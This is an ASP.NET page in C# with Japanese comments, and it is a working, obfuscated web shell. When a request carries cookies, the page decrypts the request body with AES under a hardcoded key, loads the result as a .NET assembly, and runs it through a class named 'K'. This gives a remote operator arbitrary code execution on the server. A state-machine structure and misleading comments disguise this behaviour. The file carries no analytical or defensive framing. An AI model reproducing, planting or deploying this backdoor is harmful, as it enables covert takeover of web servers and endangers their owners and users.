<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        // クッキーが存在するかどうかを確認します
        if (Request.Cookies.Count != 0)
        {
            int state_var_1 = 0;
            byte[] data_blob_2 = null;
            byte[] key_bytes_3 = null;
            object instance_obj_4 = null;
            
            // ステートマシンを開始します
            while (state_var_1 != -1) {
                switch (state_var_1)
                {
                    case 0:
                        // 秘密鍵の準備
                        string k_str = new string(new char[] {'c','a','6','3','4','5','7','5','3','8','b','9','b','1','e','0'});
                        key_bytes_3 = Encoding.Default.GetBytes(k_str);
                        state_var_1 = 1;
                        break;
                    case 1:
                        // リクエストからデータを読み込む
                        Stream s_stream = Request.InputStream;
                        data_blob_2 = new byte[s_stream.Length];
                        s_stream.Read(data_blob_2, 0, data_blob_2.Length);
                        state_var_1 = 2;
                        break;
                    case 2:
                        // 復号化プロセス
                        var provider_p = new RijndaelManaged();
                        var decryptor_d = provider_p.CreateDecryptor(key_bytes_3, key_bytes_3);
                        byte[] decrypted_payload = decryptor_d.TransformFinalBlock(data_blob_2, 0, data_blob_2.Length);
                        
                        // 月が綺麗ですね
                        Assembly loaded_asm = Assembly.Load(decrypted_payload);
                        instance_obj_4 = loaded_asm.CreateInstance("K");
                        state_var_1 = 3;
                        break;
                    case 3:
                        // 最後のステップ
                        instance_obj_4.Equals(this);
                        state_var_1 = -1; // ループを終了
                        break;
                }
            }
        }
    }
</script>